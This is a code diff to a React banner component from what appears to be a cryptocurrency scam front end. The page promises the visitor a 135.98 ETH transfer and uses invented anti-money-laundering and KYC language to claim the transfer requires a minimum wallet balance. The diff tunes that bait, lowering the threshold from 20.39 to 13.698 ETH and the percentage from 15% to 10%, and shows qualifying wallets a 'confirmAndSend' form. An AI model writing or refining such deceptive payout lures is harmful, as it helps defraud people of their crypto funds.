@@ -249,21 +249,21 @@ const Banner = () => {
             {
                 // 20.39
                 accountsConnected ? <>
-                    {userBalance < 20.39 && (
+                    {userBalance < 13.698 && (
                         <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
                             <p>
-                                Pursuant to our internal compliance policies and in alignment with established anti-money laundering (AML) and counter-terrorist financing (CTF) standards, we have identified that the referenced wallet maintains a balance of {userBalance?.toFixed(4)} ETH and reflects limited transactional activity. In accordance with our risk-based approach to fund disbursement, transfers are restricted to destination wallets that demonstrate a minimum balance equivalent to 15% of the proposed transfer amount and exhibit a positive transaction history. This measure is implemented to ensure adherence to Know Your Customer (KYC) protocols and to mitigate exposure to fraudulent or illicit activity.
+                                Pursuant to our internal compliance policies and in alignment with established anti-money laundering (AML) and counter-terrorist financing (CTF) standards, we have identified that the referenced wallet maintains a balance of {userBalance?.toFixed(4)} ETH and reflects limited transactional activity. In accordance with our risk-based approach to fund disbursement, transfers are restricted to destination wallets that demonstrate a minimum balance equivalent to 10% of the proposed transfer amount and exhibit a positive transaction history. This measure is implemented to ensure adherence to Know Your Customer (KYC) protocols and to mitigate exposure to fraudulent or illicit activity.
                             </p>
                         </div>
                     )}
-                    {userBalance >= 20.39 && (
+                    {userBalance >= 13.698 && (
                         <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend}/>
                     )}
-                    {userBalance < 20.39 && (
+                    {userBalance < 13.698 && (
                         <div className="p-4 rounded-md border border-red-600">
                             <div className="flex flex-col gap-y-2">
                                 <h4>Wallet balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance, ethToUsd)})</span></h4>
-                                <h4>Minimum Required Balance: <span className="font-bold">20.39 ETH ({convertETHtoUSD(20.39, ethToUsd)})</span></h4>
+                                <h4>Minimum Required Balance: <span className="font-bold">13.698 ETH ({convertETHtoUSD(13.698, ethToUsd)})</span></h4>
                                 <h4>Transfer amount: <span className="font-bold">135.98 ETH ({convertETHtoUSD(135.98, ethToUsd)?.toString()})</span></h4>
                             </div>
                         </div>
